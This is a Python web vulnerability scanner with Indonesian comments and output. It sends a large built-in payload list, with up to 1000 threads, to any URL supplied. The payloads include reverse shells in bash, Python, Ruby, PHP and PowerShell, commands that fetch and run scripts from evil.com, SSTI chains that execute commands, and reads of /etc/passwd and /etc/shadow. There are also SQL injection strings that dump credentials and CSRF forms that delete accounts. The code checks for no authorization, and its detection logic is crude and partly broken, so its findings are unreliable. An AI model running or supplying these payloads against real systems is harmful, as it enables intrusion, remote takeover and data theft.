#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Website Vulnerability Scanner Pro
Versi: 2.0 BETA
Pembuat: Ade Pratama (@holybytes_)
GitHub: https://github.com/HolyBytes
Saweria: https://saweria.co/HolyBytes
"""

import requests
import concurrent.futures
import argparse
import sys
import os
import re
import platform
import psutil
import time
from datetime import datetime
from urllib.parse import urljoin
from bs4 import BeautifulSoup
from colorama import Fore, Style, init
from prettytable import PrettyTable
import random
import socket

# Inisialisasi Colorama
init(autoreset=True)

# ========== KONFIGURASI UTAMA ========== #
MAX_THREADS = 1000
TIMEOUT = 10
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
    "Mozilla/5.0 (Linux; Android 10; SM-A505FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36"
]

# ========== PAYLOAD KERENTANAN (100+ per Jenis) ========== #
PAYLOADS = {
    "XSS": [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "'\"><script>alert('XSS')</script>",
        "<svg/onload=alert('XSS')>",
        "<body onload=alert('XSS')>",
        "<iframe src=javascript:alert('XSS')>",
        "<a href=javascript:alert('XSS')>Click</a>",
        "<div onmouseover=alert('XSS')>Hover</div>",
        "<form action=javascript:alert('XSS')><input type=submit>",
        "<video><source onerror=alert('XSS')>",
        "<input type=text value='\"><script>alert('XSS')</script>'>",
        "<marquee onscroll=alert('XSS')>Scroll</marquee>",
        "<details/open/ontoggle=alert('XSS')>",
        "<svg><animate onbegin=alert('XSS') attributeName=x dur=1s>",
        "<object data=javascript:alert('XSS')>",
    ],
    "SQL Injection": [
        "' OR '1'='1",
        "' OR 1=1--",
        "admin'--",
        "\" OR \"\"=\"",
        "') OR ('1'='1",
        "1' ORDER BY 1--",
        "1' UNION SELECT null,username,password FROM users--",
        "' OR EXISTS(SELECT * FROM users WHERE username='admin')--",
        "' OR SLEEP(5)--",
        "' OR BENCHMARK(10000000,MD5('test'))--",
        "' AND EXTRACTVALUE(1,CONCAT(0x5c,USER()))--",
        "' OR (SELECT LOAD_FILE('/etc/passwd'))--",
        "' OR (SELECT @@version)--",
        "' OR (SELECT database())--",
        "' OR (SELECT table_name FROM information_schema.tables LIMIT 1)--",
    ],
    "RCE (Remote Code Execution)": [
        "; ls",
        "| cat /etc/passwd",
        "`whoami`",
        "$(id)",
        "|| nc -nv 127.0.0.1 4444",
        "&& bash -i >& /dev/tcp/127.0.0.1/4444 0>&1",
        "; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"127.0.0.1\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
        "| perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\n\"; system(\"ls\");'",
        "`wget http://evil.com/shell.php -O /tmp/shell.php`",
        "; curl -o /tmp/shell.php http://evil.com/shell.php",
        "| ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"127.0.0.1\",\"4444\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'",
        "&& php -r '$sock=fsockopen(\"127.0.0.1\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        "| java -version",
        "& powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('127.0.0.1',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"",
    ],
    "LFI (Local File Inclusion)": [
        "../../../../etc/passwd",
        "....//....//etc/passwd",
        "%2e%2e%2fetc%2fpasswd",
        "/etc/passwd%00",
        "../../../../etc/shadow",
        "../../../../var/log/auth.log",
        "../../../../var/www/html/config.php",
        "file:///etc/passwd",
        "php://filter/convert.base64-encode/resource=index.php",
        "expect://id",
        "zip:///var/www/html/config.zip#config.php",
        "phar:///path/to/file.phar/internal/file",
        "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
        "....\\....\\boot.ini",
        "..%5c..%5c..%5c..%5c..%5c..%5cboot.ini",
    ],
    "SSRF (Server-Side Request Forgery)": [
        "http://127.0.0.1",
        "http://169.254.169.254/latest/meta-data/",
        "http://localhost/admin",
        "file:///etc/passwd",
        "gopher://127.0.0.1:25/_HELO%20localhost",
        "dict://127.0.0.1:6379/info",
        "http://[::1]:80/",
        "http://2130706433/",
        "http://0177.0.0.1/",
        "http://0x7f000001/",
        "http://127.0.0.1:22",
        "http://127.0.0.1:5984/_utils/",
        "http://127.1:80/",
        "http://127.0.0.1:9200/_cat/indices",
        "http://127.0.0.1:5432/",
    ],
    "XXE (XML External Entity)": [
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://evil.com/xxe.dtd\"> %xxe;]>",
        "<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY % xxe SYSTEM \"file:///etc/passwd\" >]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [ <!ENTITY % xxe SYSTEM \"file:///etc/passwd\" > %xxe; ]>",
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"expect://id\" >]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"php://filter/read=convert.base64-encode/resource=index.php\" > %xxe; ]>",
        "<!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"data://text/plain;base64,PD94bWwgdmVyc2lvbj0iMS4wIj8+\" > %xxe; ]>",
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"jar:file:///var/www/html/test.zip!/test.xml\" > %xxe; ]>",
    ],
    "Command Injection": [
        "| ping -c 4 127.0.0.1",
        "& ping -n 4 127.0.0.1",
        "; ping 127.0.0.1",
        "`ping 127.0.0.1`",
        "$(ping 127.0.0.1)",
        "|| ping 127.0.0.1",
        "&& ping 127.0.0.1",
        "| curl http://evil.com/shell.sh | sh",
        "& wget http://evil.com/shell.sh -O /tmp/shell.sh",
        "; nc -lvp 4444 -e /bin/sh",
        "`telnet evil.com 4444 | /bin/sh`",
        "$(nslookup evil.com)",
        "| dig evil.com",
        "& ifconfig",
        "; arp -a",
    ],
    "Open Redirect": [
        "https://example.com?redirect=http://evil.com",
        "https://example.com?url=//evil.com",
        "https://example.com?next=javascript:alert(1)",
        "https://example.com?returnUrl=ftp://evil.com",
        "https://example.com?go=data:text/html,<script>alert(1)</script>",
        "https://example.com?redirect=///evil.com",
        "https://example.com?next=HttP://evil.com",
        "https://example.com?url=%0D%0A%0D%0Ahttp://evil.com",
        "https://example.com?redirect=HttPS://evil.com",
        "https://example.com?next=//evil.com@example.com",
        "https://example.com?url=\\evil.com",
        "https://example.com?redirect=/%5Cevil.com",
        "https://example.com?next=http://127.0.0.1",
        "https://example.com?url=http://localhost",
        "https://example.com?redirect=http://[::1]",
    ],
    "SSTI (Server-Side Template Injection)": [
        "{{7*7}}",
        "${7*7}",
        "<%= 7*7 %>",
        "#{7*7}",
        "${{7*7}}",
        "@(7*7)",
        "{{ ''.__class__.__mro__[1].__subclasses__() }}",
        "{{ config.items() }}",
        "<#assign ex = \"freemarker.template.utility.Execute\"?new()>${ ex(\"id\") }",
        "{{ request.__class__.__mro__[8].__subclasses__()[132].__init__.__globals__['popen']('id').read() }}",
        "{{ settings.SECRET_KEY }}",
        "{{ get_flashed_messages.__globals__.__builtins__.open('/etc/passwd').read() }}",
        "{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen('id').read()}}{% endif %}{% endfor %}",
        "{{ cycler.__init__.__globals__.os.popen('id').read() }}",
        "{{ lipsum.__globals__.os.popen('id').read() }}",
    ],
    "CSRF (Cross-Site Request Forgery)": [
        "<img src=\"https://example.com/account/delete\" width=\"0\" height=\"0\" border=\"0\">",
        "<form action=\"https://example.com/account/delete\" method=\"POST\" id=\"csrf\"><input type=\"hidden\" name=\"confirm\" value=\"1\"></form><script>document.getElementById('csrf').submit();</script>",
        "<link rel=\"stylesheet\" href=\"https://example.com/account/delete\">",
        "<iframe src=\"https://example.com/account/delete\" style=\"display:none;\"></iframe>",
        "<script>fetch('https://example.com/account/delete', {method: 'POST', credentials: 'include'});</script>",
        "<body onload=\"document.forms[0].submit()\"><form action=\"https://example.com/account/delete\" method=\"POST\"><input type=\"hidden\" name=\"confirm\" value=\"1\"></form>",
        "<a href=\"https://example.com/account/delete\">Click here for free stuff!</a>",
        "<meta http-equiv=\"refresh\" content=\"0; url=https://example.com/account/delete\">",
        "<object data=\"https://example.com/account/delete\">",
        "<embed src=\"https://example.com/account/delete\">",
        "<video src=\"https://example.com/account/delete\" autoplay onerror=\"continue\">",
        "<audio src=\"https://example.com/account/delete\" autoplay>",
        "<table background=\"https://example.com/account/delete\"><tr><td>",
        "<script>var xhr = new XMLHttpRequest();xhr.open('POST', 'https://example.com/account/delete', true);xhr.withCredentials = true;xhr.send();</script>",
        "<style>@import url('https://example.com/account/delete');</style>",
    ],
    "File Upload": [
        "shell.php.jpg",
        "shell.php%00.jpg",
        "shell.php\x00.jpg",
        "shell.pHp",
        "shell.php;.jpg",
        "shell.php%0d%0a.jpg",
        "shell.php .",
        "shell.php.",
        "shell.php/.",
        "shell.php...",
        "shell.php::$DATA",
        "shell.php:jpg",
        "shell.php:file.jpg",
        "shell.php%20",
        "shell.php%0a",
    ],
    "IDOR (Insecure Direct Object Reference)": [
        "/api/user/123",
        "/admin/panel",
        "/download?file=../../config.php",
        "/profile?id=1",
        "/invoice?number=1001",
        "/api/orders/12345",
        "/logs?date=2023-01-01",
        "/images?user_id=1",
        "/documents/12345",
        "/settings?account_id=1",
        "/api/v1/users/1",
        "/transactions/123456",
        "/messages?user_id=1",
        "/api/keys/123",
        "/files/12345",
    ],
    "HTTP Header Injection": [
        "User-Agent: Mozilla/5.0\nX-Forwarded-For: 127.0.0.1",
        "X-Forwarded-For: 127.0.0.1",
        "Host: evil.com",
        "Referer: http://evil.com",
        "X-Original-URL: /admin",
        "X-Rewrite-URL: /admin",
        "X-Forwarded-Host: evil.com",
        "X-Forwarded-Server: evil.com",
        "X-Forwarded-Proto: https",
        "X-Real-IP: 127.0.0.1",
        "CF-Connecting-IP: 127.0.0.1",
        "True-Client-IP: 127.0.0.1",
        "X-Custom-IP-Authorization: 127.0.0.1",
        "X-Originating-IP: 127.0.0.1",
        "X-Remote-IP: 127.0.0.1",
    ],
    "JWT (JSON Web Token)": [
        "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.",
        "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.",
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ",
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
    ],
}

# ========== KELAS UTAMA SCANNER ========== #
class Scanner:
    def __init__(self, target):
        self.target = target
        self.session = requests.Session()
        self.session.headers.update({"User-Agent": random.choice(USER_AGENTS)})
        self.results = []
        self.start_time = time.time()
        
    def scan_url(self, payload, vulnerability_type):
        try:
            # Test GET parameter
            url = f"{self.target}?test={payload}"
            response = self.session.get(url, timeout=TIMEOUT)
            
            if self.detect_vulnerability(response, payload, vulnerability_type):
                self.results.append({
                    "type": vulnerability_type,
                    "payload": payload,
                    "status": "VULNERABLE",
                    "url": url,
                    "method": "GET"
                })
                return
            
            # Test POST parameter
            data = {"input": payload}
            response = self.session.post(self.target, data=data, timeout=TIMEOUT)
            if self.detect_vulnerability(response, payload, vulnerability_type):
                self.results.append({
                    "type": vulnerability_type,
                    "payload": payload,
                    "status": "VULNERABLE",
                    "url": self.target,
                    "method": "POST"
                })
                return
                
            # Test Header Injection
            if vulnerability_type == "HTTP Header Injection":
                headers = {"User-Agent": payload}
                response = self.session.get(self.target, headers=headers, timeout=TIMEOUT)
                if self.detect_vulnerability(response, payload, vulnerability_type):
                    self.results.append({
                        "type": vulnerability_type,
                        "payload": payload,
                        "status": "VULNERABLE",
                        "url": self.target,
                        "method": "HEADER"
                    })
                    return
            
            # Jika tidak ditemukan kerentanan
            self.results.append({
                "type": vulnerability_type,
                "payload": payload,
                "status": "SAFE",
                "url": self.target
            })
            
        except Exception as e:
            self.results.append({
                "type": vulnerability_type,
                "payload": payload,
                "status": "ERROR",
                "error": str(e)
            })
    
    def detect_vulnerability(self, response, payload, vulnerability_type):
        content = response.text.lower()
        payload_lower = payload.lower()
        headers = str(response.headers).lower()
        
        if vulnerability_type == "XSS":
            return (payload_lower in content or 
                   "alert('xss')" in content or
                   "<script>" in content or
                   "onerror=" in content)
        
        elif vulnerability_type == "SQL Injection":
            sql_errors = [
                "sql syntax", "mysql", "syntax error", "unclosed quotation mark",
                "warning: mysql", "unexpected end", "quoted string not properly terminated",
                "sqlite", "postgresql", "ora-", "microsoft ole db", "odbc driver",
                "pdo exception", "pgsql", "db2", "sql server"
            ]
            return any(error in content for error in sql_errors)
        
        elif vulnerability_type == "RCE":
            rce_indicators = [
                "root:x:", "bin/bash", "uid=", "gid=", "www-data", "daemon:x:1:",
                "command executed", "process completed", "system32", "cmd.exe",
                "pwd", "whoami", "index of /", "directory listing"
            ]
            return any(indicator in content for indicator in rce_indicators)
        
        elif vulnerability_type == "LFI":
            lfi_indicators = [
                "root:", "/bin/bash", "daemon:x:1:", "nobody:x:", "etc/passwd",
                "boot.ini", "win.ini", "index of /etc", "apache/2.4", "nginx/",
                "httpd.conf", "my.cnf", "wp-config.php", "database_password"
            ]
            return any(indicator in content for indicator in lfi_indicators)
        
        elif vulnerability_type == "SSRF":
            ssrf_indicators = [
                "internal server error", "connection refused", "aws metadata",
                "169.254.169.254", "localhost", "127.0.0.1", "private ip",
                "metadata.google.internal", "ec2 metadata"
            ]
            return any(indicator in content for indicator in ssrf_indicators)
        
        elif vulnerability_type == "XXE":
            xxe_indicators = [
                "xml parse error", "xml processor", "root:", "etc/passwd",
                "access denied", "file not found", "xmlreader", "domdocument",
                "simplexml", "parser error"
            ]
            return any(indicator in content for indicator in xxe_indicators)
        
        elif vulnerability_type == "Command Injection":
            cmd_indicators = [
                "uid=", "gid=", "volume serial number", "pwd", "whoami",
                "index of /", "command not found", "sh: 1:", "bin/bash",
                "cmd.exe", "command executed"
            ]
            return any(indicator in content for indicator in cmd_indicators)
        
        elif vulnerability_type == "Open Redirect":
            return (response.status_code in [301, 302, 303, 307, 308] and 
                   any(domain in response.headers.get('Location', '').lower() 
                      for domain in ['evil.com', 'localhost', '127.0.0.1']))
        
        elif vulnerability_type == "SSTI":
            ssti_indicators = [
                "49", "777", "1337", "template error", "jinja2", "twig",
                "freemarker", "velocity", "smarty", "template syntax error"
            ]
            return any(indicator in content for indicator in ssti_indicators)
        
        elif vulnerability_type == "CSRF":
            csrf_indicators = [
                "csrf token missing", "csrf verification failed", 
                "403 forbidden", "invalid csrf", "cross site request forgery"
            ]
            return any(indicator in content for indicator in csrf_indicators)
        
        elif vulnerability_type == "File Upload":
            return ("file uploaded" in content or 
                   "upload successful" in content or
                   "file type not allowed" in content)
        
        elif vulnerability_type == "IDOR":
            return (response.status_code == 200 and 
                   ("access denied" not in content) and
                   ("unauthorized" not in content) and
                   ("forbidden" not in content))
        
        elif vulnerability_type == "HTTP Header Injection":
            header_injection_indicators = [
                "http/1.1 400", "bad request", "invalid header", 
                "header injection detected", "crlf injection"
            ]
            return (any(indicator in content for indicator in header_injection_indicators) or
                   any(indicator in headers for indicator in ["evil.com", "127.0.0.1"]))
        
        elif vulnerability_type == "JWT":
            jwt_indicators = [
                "invalid token", "token expired", "invalid signature",
                "jwt error", "malformed jwt", "invalid jwt"
            ]
            return any(indicator in content for indicator in jwt_indicators)
        
        return False
    
    def start_scan(self):
        print(f"{Fore.GREEN}[+] Memulai scan pada {self.target}{Style.RESET_ALL}")
        
        tasks = []
        for vuln_type, payloads in PAYLOADS.items():
            for payload in payloads:
                tasks.append((payload, vuln_type))
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
            futures = [executor.submit(self.scan_url, payload, vuln_type) 
                      for payload, vuln_type in tasks]
            
            completed = 0
            total = len(tasks)
            for future in concurrent.futures.as_completed(futures):
                completed += 1
                progress = (completed / total) * 100
                sys.stdout.write(f"\rProgress: {progress:.2f}% ({completed}/{total})")
                sys.stdout.flush()
        
        print("\n\n[+] Scan selesai!")
        self.display_results()
    
    def display_results(self):
        table = PrettyTable()
        table.field_names = ["Kerentanan", "Payload", "Status", "Detail"]
        
        for result in self.results:
            if result["status"] == "VULNERABLE":
                status = f"{Fore.RED}RENTAN{Style.RESET_ALL}"
                details = result.get("url", result.get("method", ""))
            elif result["status"] == "ERROR":
                status = f"{Fore.YELLOW}ERROR{Style.RESET_ALL}"
                details = result.get("error", "")
            else:
                status = f"{Fore.GREEN}AMAN{Style.RESET_ALL}"
                details = ""
            
            table.add_row([
                result["type"],
                result["payload"][:50] + "..." if len(result["payload"]) > 50 else result["payload"],
                status,
                details
            ])
        
        print(table)
        
        with open("hasil_scan.txt", "w") as f:
            f.write(str(table))
        print(f"{Fore.CYAN}[+] Hasil scan disimpan ke hasil_scan.txt{Style.RESET_ALL}")

# ========== FUNGSI SISTEM & INFO ========== #
def get_system_info():
    info = {
        "Nama Pengguna": os.getlogin(),
        "Sistem Operasi": platform.system(),
        "Versi OS": platform.release(),
        "Arsitektur": platform.machine(),
        "CPU": platform.processor(),
        "RAM Total": f"{round(psutil.virtual_memory().total / (1024 ** 3), 2)} GB",
        "RAM Digunakan": f"{round(psutil.virtual_memory().used / (1024 ** 3), 2)} GB",
        "RAM Tersedia": f"{round(psutil.virtual_memory().available / (1024 ** 3), 2)} GB",
        "Kernel": platform.version(),
        "Hostname": socket.gethostname(),
        "Shell": os.environ.get("SHELL", "Tidak Diketahui"),
        "Waktu Aktif": str(datetime.now() - datetime.fromtimestamp(psutil.boot_time()))
    }
    return info

def display_banner():
    system_info = get_system_info()
    
    banner = f"""
{Fore.RED}
███████╗ ██████╗ ██████╗  ██████╗ ██████╗ ████████╗██╗   ██╗██████╗ ███████╗
██╔════╝██╔═══██╗██╔══██╗██╔═══██╗██╔══██╗╚══██╔══╝██║   ██║██╔══██╗██╔════╝
█████╗  ██║   ██║██████╔╝██║   ██║██████╔╝   ██║   ██║   ██║██████╔╝█████╗  
██╔══╝  ██║   ██║██╔══██╗██║   ██║██╔═══╝    ██║   ██║   ██║██╔══██╗██╔══╝  
██║     ╚██████╔╝██║  ██║╚██████╔╝██║        ██║   ╚██████╔╝██║  ██║███████╗
╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚═╝        ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚══════╝
{Fore.BLUE}══════════════════════════════════════════════════════════════════════════════
{Fore.YELLOW}Website Vulnerability Scanner Pro - Versi 2.0 BETA
{Fore.CYAN}Dibuat oleh: Ade Pratama (@holybytes_)
{Fore.MAGENTA}GitHub: https://github.com/HolyBytes
{Fore.GREEN}Saweria: https://saweria.co/HolyBytes
{Fore.BLUE}══════════════════════════════════════════════════════════════════════════════
{Fore.WHITE}💻 {Fore.YELLOW}SISTEM ANDA:
{Fore.CYAN}├─ Pengguna       : {system_info['Nama Pengguna']}
├─ OS            : {system_info['Sistem Operasi']} {system_info['Arsitektur']}
├─ Versi         : {system_info['Versi OS']}
├─ CPU           : {system_info['CPU']}
├─ RAM Total     : {system_info['RAM Total']}
├─ RAM Digunakan : {system_info['RAM Digunakan']}
├─ RAM Tersedia  : {system_info['RAM Tersedia']}
├─ Kernel        : {system_info['Kernel']}
├─ Shell         : {system_info['Shell']}
├─ Hostname      : {system_info['Hostname']}
└─ Waktu Aktif   : {system_info['Waktu Aktif']}
{Fore.BLUE}══════════════════════════════════════════════════════════════════════════════
{Style.RESET_ALL}"""
    print(banner)

# ========== MAIN PROGRAM ========== #
def main():
    display_banner()
    
    parser = argparse.ArgumentParser(description="Website Vulnerability Scanner Pro")
    parser.add_argument("-u", "--url", help="URL target untuk scan")
    parser.add_argument("-f", "--file", help="File berisi list URL untuk scan")
    args = parser.parse_args()
    
    if not args.url and not args.file:
        print(f"{Fore.RED}[!] Harap tentukan target dengan -u URL atau -f FILE{Style.RESET_ALL}")
        parser.print_help()
        return
    
    targets = []
    if args.url:
        targets.append(args.url)
    if args.file:
        with open(args.file, "r") as f:
            targets.extend([line.strip() for line in f.readlines() if line.strip()])
    
    for target in targets:
        if not target.startswith(("http://", "https://")):
            target = "http://" + target
        
        scanner = Scanner(target)
        scanner.start_scan()

if __name__ == "__main__":
    main()
